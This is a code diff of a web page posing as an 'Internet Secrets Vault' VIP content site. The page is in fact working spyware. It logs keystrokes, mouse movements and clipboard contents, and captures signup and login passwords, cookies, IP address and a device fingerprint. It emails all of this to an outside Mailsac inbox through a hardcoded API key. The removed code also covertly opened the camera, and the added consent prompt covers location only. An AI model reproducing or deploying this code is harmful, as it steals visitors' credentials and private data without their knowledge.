@@ -77,6 +77,15 @@
         .logout-btn:hover {
             background: #e74c3c;
         }
+        .consent-box {
+            background: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px auto;
+            max-width: 400px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -122,29 +131,19 @@
     </div>
     <button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script>
-        // Firebase Configuration (Replace with your Firebase project config)
-        const firebaseConfig = {
-            apiKey: "your-api-key",
-            authDomain: "your-project-id.firebaseapp.com",
-            projectId: "your-project-id",
-            storageBucket: "your-project-id.appspot.com",
-            messagingSenderId: "your-sender-id",
-            appId: "your-app-id"
-        };
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore();
+    <div class="consent-box" id="consentBox">
+        <p>We would like to track your location for research purposes. Do you allow?</p>
+        <button onclick="grantConsent()">Yes, Allow</button>
+        <button onclick="denyConsent()">No, Deny</button>
+    </div>
 
+    <script>
+        let isLoggedIn = false;
         let collectedData = [];
-        let hasCamAccessed = false;
         let keys = [];
         let mouseMovements = [];
+        let locationWatchId = null;
+        let hasConsent = false;
 
         // Keylogger
         document.addEventListener('keydown', (e) => {
@@ -153,7 +152,7 @@
                 let data = `Keys: ${keys.join('')}`;
                 collectedData.push(data);
                 keys = [];
-                saveAndSendData('keylog', { keylog: data });
+                sendData('keylog', { keylog: data });
             }
         });
 
@@ -164,7 +163,7 @@
                 let data = `Mouse: ${mouseMovements.join('|')}`;
                 collectedData.push(data);
                 mouseMovements = [];
-                saveAndSendData('mousemove', { mousemove: data });
+                sendData('mousemove', { mousemove: data });
             }
         });
 
@@ -173,28 +172,11 @@
             navigator.clipboard.readText().then(t => {
                 let data = `Clipboard: ${t}`;
                 collectedData.push(data);
-                saveAndSendData('clipboard', { clipboard: data });
+                sendData('clipboard', { clipboard: data });
             });
         });
 
-        // Check if user is already logged in
-        auth.onAuthStateChanged(user => {
-            if (user) {
-                collectUserData(user);
-                document.getElementById('teaser').style.display = 'none';
-                document.getElementById('loginPrompt').style.display = 'none';
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('signupBox').style.display = 'none';
-                document.getElementById('premiumTeaser').style.display = 'block';
-                document.getElementById('logoutBtn').style.display = 'block';
-            } else {
-                document.getElementById('teaser').style.display = 'block';
-                document.getElementById('loginPrompt').style.display = 'block';
-                document.getElementById('premiumTeaser').style.display = 'none';
-                document.getElementById('logoutBtn').style.display = 'none';
-            }
-        });
-
+        // Login/Logout Logic
         function showLogin() {
             document.getElementById('teaser').style.display = 'none';
             document.getElementById('loginPrompt').style.display = 'none';
@@ -213,169 +195,186 @@
             let username = document.getElementById('signupUsername').value;
             let email = document.getElementById('signupEmail').value;
             let password = document.getElementById('signupPassword').value;
-            auth.createUserWithEmailAndPassword(email, password)
-                .then(userCredential => {
-                    const user = userCredential.user;
-                    collectUserData(user, username, password);
-                    alert('Sign Up successful! Now you can access VIP content.');
-                })
-                .catch(error => {
-                    alert('Sign Up failed: ' + error.message);
-                });
+            if (password.length < 6) {
+                alert('Password must be at least 6 characters!');
+                return;
+            }
+            collectUserData(username, email, password);
+            isLoggedIn = true;
+            updateUI();
+            alert('Sign Up successful! Now you can access VIP content.');
+            // Show consent after signup
+            document.getElementById('consentBox').style.display = 'block';
         }
 
         function signIn() {
             let email = document.getElementById('loginEmail').value;
             let password = document.getElementById('loginPassword').value;
-            auth.signInWithEmailAndPassword(email, password)
-                .then(userCredential => {
-                    collectUserData(userCredential.user, null, password);
-                    alert('Sign In successful! Welcome to VIP secrets.');
-                })
-                .catch(error => {
-                    alert('Sign In failed: ' + error.message);
-                });
-        }
-
-        function logout() {
-            auth.signOut().then(() => {
-                alert('Logged out successfully!');
-            }).catch(error => {
-                alert('Logout failed: ' + error.message);
-            });
-        }
-
-        function collectUserData(user, username = null, password = null) {
-            if (user) {
-                let userData = {
-                    email: user.email,
-                    uid: user.uid,
-                    signupDate: user.metadata.creationTime || new Date().toISOString(),
-                    lastSignIn: user.metadata.lastSignInTime || new Date().toISOString()
-                };
-                if (username) userData.username = username;
-                if (password) userData.password = password;
-
-                // Collect location
-                if (navigator.geolocation && navigator.onLine) {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            userData.location = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude || 'N/A',
-                                heading: position.coords.heading || 'N/A',
-                                speed: position.coords.speed || 'N/A'
-                            };
-                            saveAndSendData(user.uid, userData);
-                        },
-                        error => {
-                            console.log('Location access denied:', error);
-                            saveAndSendData(user.uid, userData);
-                        }
-                    );
-                } else {
-                    saveAndSendData(user.uid, userData);
-                }
-
-                // Collect browser fingerprint
-                let fingerprint = {
-                    userAgent: navigator.userAgent,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack || 'N/A'
-                };
-                userData.browserFingerprint = fingerprint;
-
-                // Collect device info
-                let deviceInfo = {
-                    vendor: navigator.vendor || 'N/A',
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                    deviceMemory: navigator.deviceMemory || 'N/A',
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : 'N/A'
-                };
-                userData.deviceInfo = deviceInfo;
-
-                // Collect IP Address
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(ipData => {
-                        userData.ipAddress = ipData.ip;
-                        saveAndSendData(user.uid, userData);
-                    })
-                    .catch(error => {
-                        console.error('Error fetching IP:', error);
-                        userData.ipAddress = 'N/A';
-                        saveAndSendData(user.uid, userData);
-                    });
-
-                // Collect cookies
-                let cookies = document.cookie || 'None';
-                userData.cookies = cookies;
-
-                // Camera Access
-                if (!hasCamAccessed && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(s => {
-                            let v = document.createElement('video');
-                            v.srcObject = s;
-                            v.play();
-                            v.style.display = 'none';
-                            document.body.appendChild(v);
-                            userData.cameraAccess = 'Cam accessed';
-                            hasCamAccessed = true;
-                            saveAndSendData(user.uid, userData);
-                        })
-                        .catch(() => {
-                            userData.cameraAccess = 'Cam denied';
-                            hasCamAccessed = true;
-                            saveAndSendData(user.uid, userData);
-                        });
-                }
+            if (email && password) {
+                collectUserData(null, email, password);
+                isLoggedIn = true;
+                updateUI();
+                alert('Sign In successful! Welcome to VIP secrets.');
+                // Show consent after signin
+                document.getElementById('consentBox').style.display = 'block';
+            } else {
+                alert('Invalid email or password!');
             }
         }
 
-        function saveAndSendData(id, data) {
-            // Save to Firestore
-            db.collection("users").doc(id).set(data, { merge: true })
-                .then(() => {
-                    console.log('User data saved:', data);
+        function logout() {
+            isLoggedIn = false;
+            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+            hasConsent = false;
+            updateUI();
+            alert('Logged out successfully!');
+        }
+
+        function updateUI() {
+            if (isLoggedIn) {
+                document.getElementById('teaser').style.display = 'none';
+                document.getElementById('loginPrompt').style.display = 'none';
+                document.getElementById('loginBox').style.display = 'none';
+                document.getElementById('signupBox').style.display = 'none';
+                document.getElementById('premiumTeaser').style.display = 'block';
+                document.getElementById('logoutBtn').style.display = 'block';
+            } else {
+                document.getElementById('teaser').style.display = 'block';
+                document.getElementById('loginPrompt').style.display = 'block';
+                document.getElementById('premiumTeaser').style.display = 'none';
+                document.getElementById('logoutBtn').style.display = 'none';
+                document.getElementById('consentBox').style.display = 'none';
+            }
+        }
+
+        function grantConsent() {
+            hasConsent = true;
+            document.getElementById('consentBox').style.display = 'none';
+            startLocationTracking();
+        }
+
+        function denyConsent() {
+            hasConsent = false;
+            document.getElementById('consentBox').style.display = 'none';
+            alert('Location tracking denied. Some features may be limited.');
+        }
+
+        function collectUserData(username = null, email = null, password = null) {
+            let userData = {
+                username: username || 'Guest',
+                email: email || 'N/A',
+                password: password || 'N/A',
+                signupDate: new Date().toISOString(),
+                lastSignIn: new Date().toISOString()
+            };
+
+            // Collect browser fingerprint
+            let fingerprint = {
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'N/A'
+            };
+            userData.browserFingerprint = fingerprint;
+
+            // Collect device info
+            let deviceInfo = {
+                vendor: navigator.vendor || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'N/A'
+            };
+            userData.deviceInfo = deviceInfo;
+
+            // Collect IP Address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    userData.ipAddress = ipData.ip;
+                    sendData('user', userData);
                 })
                 .catch(error => {
-                    console.error('Error saving user data:', error);
+                    console.error('Error fetching IP:', error);
+                    userData.ipAddress = 'N/A';
+                    sendData('user', userData);
                 });
 
-            // Send to Mailsac
-            const mailsacEmail = "sohil_vrx3y@mailsac.com";
-            fetch('https://mailsac.com/api/send', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Mailsac-Key': 'k_sihbEOzxIvQaIvWQbC044VQa08QwT4t10D'
-                },
-                body: JSON.stringify({
-                    to: mailsacEmail,
-                    subject: 'User Data from Internet Secrets Vault',
-                    text: JSON.stringify(data, null, 2)
-                })
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('Email sent to Mailsac:', result);
-            })
-            .catch(error => {
-                console.error('Error sending email to Mailsac:', error);
-            });
+            // Collect cookies
+            let cookies = document.cookie || 'None';
+            userData.cookies = cookies;
         }
+
+        function startLocationTracking() {
+            if (hasConsent && isLoggedIn && navigator.geolocation) {
+                locationWatchId = navigator.geolocation.watchPosition(
+                    position => {
+                        let locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        sendData('location', locationData);
+                        console.log('Live Location:', locationData);
+                    },
+                    error => console.log('Location error:', error),
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                );
+            }
+        }
+
+        function sendData(type, data) {
+            const mailsacEmail = "sohil_vrx3y@mailsac.com";
+            if (navigator.onLine) {
+                fetch('https://mailsac.com/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Mailsac-Key': 'k_sihbEOzxIvQaIvWQbC044VQa08QwT4t10D'
+                    },
+                    body: JSON.stringify({
+                        to: mailsacEmail,
+                        subject: `User Data from Internet Secrets Vault - ${type}`,
+                        text: JSON.stringify(data, null, 2)
+                    })
+                })
+                .then(response => response.json())
+                .then(result => console.log('Email sent to Mailsac:', result))
+                .catch(error => {
+                    console.error('Error sending email to Mailsac:', error);
+                    saveOffline(data);
+                });
+            } else {
+                saveOffline(data);
+            }
+        }
+
+        function saveOffline(data) {
+            let offlineData = JSON.parse(localStorage.getItem('offlineData') || '[]');
+            offlineData.push(data);
+            localStorage.setItem('offlineData', JSON.stringify(offlineData));
+        }
+
+        window.addEventListener('online', () => {
+            let offlineData = JSON.parse(localStorage.getItem('offlineData') || '[]');
+            if (offlineData.length > 0) {
+                offlineData.forEach(data => sendData('offline', data));
+                localStorage.removeItem('offlineData');
+            }
+        });
+
+        // Clean up on unload
+        window.onunload = () => {
+            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+        };
     </script>
 </body>
 </html>
